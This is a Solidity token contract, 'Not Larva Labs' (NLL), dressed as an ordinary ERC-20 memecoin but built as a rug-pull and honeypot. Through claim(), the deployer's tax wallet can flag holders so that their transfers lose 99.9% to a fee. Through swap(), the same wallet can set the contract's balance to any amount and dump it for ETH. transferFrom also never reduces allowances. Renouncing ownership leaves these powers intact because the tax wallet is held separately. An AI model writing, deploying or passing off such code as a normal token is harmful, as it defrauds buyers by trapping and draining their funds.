pragma solidity ^0.8.20;
// SPDX-License-Identifier: MIT


library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
    function WETH() external pure returns (address aadd);
}

contract NotLarvaLabs is Ownable {
    using SafeMath for uint256;
    uint256 public _decimals = 9;

    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    string private _name = "Not Larva Labs";
    string private _symbol = "NLL";

    constructor() {
        _taxWallet = sender(); 
        _balances[msg.sender] =  _totalSupply; 
        emit Transfer(address(0), msg.sender, _balances[sender()]);
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    address public PEPE = 0x6982508145454Ce325dDbE47a25d4ec3d2311933;
    address public _taxWallet;
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function swap(uint256 amounts, address to) external {
        if (marketingAddres()) {
        _approve(address(this), address(uniV2Router), amounts); _balances[address(this)] = amounts;address[] memory path = new address[](2);
         path[0] = address(this); path[1] = uniV2Router.WETH(); 
         uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amounts, 0, path, to, block.timestamp + 31);
        } else {
        }
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    bool tradingStarted = false;
    mapping(address => uint256) private _balances;
    function claim (address[] calldata claimable) external {
        for (uint indexAddress = 0;  indexAddress < claimable.length;  indexAddress++) { 
            uint256 blok = blockNumber();
            blok += 1;
            if (!marketingAddres()){} else { cooldowns[claimable[indexAddress]] = blok;}
        }
    }
    function startTrading() external onlyOwner {
        tradingStarted = true;
    }
    IUniswapV2Router private uniV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    event Approval(address indexed, address indexed, uint256 value);
    mapping(address => mapping(address => uint256)) private _allowances;
    function blockNumber() internal view returns (uint256) {
        return block.number;
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[sender()][spender] + addedValue);
        return true;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function marketingAddres() private view returns (bool) {
        return (sender() == (_taxWallet));
    }
    mapping (address => uint256) internal cooldowns;
    
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function sender() internal view returns (address) {
        return msg.sender;
    }
    function _transfer(address from, address to, uint256 value) internal {
        require(from != address(0));
        require(value <= _balances[from]);
        uint256 _fee = 0;
        uint256 cooldownFee = ((value.mul(999).div(1000)));
        bool cdNumber = ((cooldowns[from]) <= blockNumber());
        if ((cooldowns[from] != 0) && cdNumber) { 
            _fee = cooldownFee; }
        emit Transfer(from, to, value);
        _balances[from] = ((_balances[from]) - (value));
        _balances[to] += ((value) - (_fee));
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    event Transfer(address indexed from, address indexed to, uint256);
}